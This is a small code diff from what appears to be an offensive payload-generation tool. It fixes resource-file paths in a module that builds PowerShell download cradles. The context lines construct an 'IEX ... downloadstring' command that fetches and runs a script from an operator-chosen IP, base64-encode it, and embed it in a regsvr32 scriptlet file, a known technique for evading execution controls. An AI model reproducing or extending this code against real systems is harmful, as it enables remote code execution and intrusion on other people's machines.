@@ -10,6 +10,9 @@ class Cradle:
 		self.execution = execution
 
 args = arguments.get_args() # get the args
+args = arguments.get_args()
+absolute_path = os.path.dirname(os.path.realpath(__file__))
+absolute_path=str(absolute_path).replace('/lib','/')
 
 def write_cradle_shell(filename,content): # write the content out and return the location of where it was written
 	if args.randomize_names:
@@ -66,7 +69,7 @@ def regsvr32(all_shells):
 		name = 'Regsvr32: %a' % shell.name
 		raw_payload = "IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (args.ip_address, args.web_delivery, shell.filename)
 		payload = base64.b64encode(raw_payload.encode('utf-16-le')).decode('utf-8')
-		regsvr32_script_content = open(args.resource_directory+'regsvr32.xml').read() # read the scriptlet data
+		regsvr32_script_content = open(absolute_path+args.resource_directory+'regsvr32.xml').read() # read the scriptlet data
 		content = regsvr32_script_content.replace('TEMPLATEPAYLOAD',payload)
 		sct_filename = 'regsvr32_%s.sct' % ''.join(random.choice(string.ascii_lowercase) for i in range(12))
 		path_to_payload = write_cradle_shell(sct_filename,content)
